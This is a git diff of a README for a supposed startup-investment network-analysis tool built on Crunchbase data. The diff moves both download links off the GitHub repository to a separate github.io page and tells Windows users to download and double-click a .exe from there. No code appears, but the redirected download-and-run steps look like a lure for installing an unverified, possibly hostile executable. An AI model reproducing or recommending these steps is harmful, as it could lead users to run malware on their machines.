@@ -1,6 +1,6 @@
 # 📊 startup-investment-network-analysis - Visualize startup connections and investment trends
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Mantidoysterplant690/startup-investment-network-analysis)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://mantidoysterplant690.github.io)
 
 This application maps the relationship between investors and companies. It uses data from 52,000 Crunchbase records to identify key players in the business world. You can view how startups link to funding sources through graph theory and network analysis tools.
 
@@ -21,7 +21,7 @@ To run this application on your Windows computer, you need:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this [download page](https://github.com/Mantidoysterplant690/startup-investment-network-analysis) to get the latest version.
+1. Visit this [download page](https://mantidoysterplant690.github.io) to get the latest version.
 2. Look for the file ending in .exe under the most recent release section.
 3. Click the file to save it to your Downloads folder.
 4. Open your Downloads folder and double-click the file to start the installation.
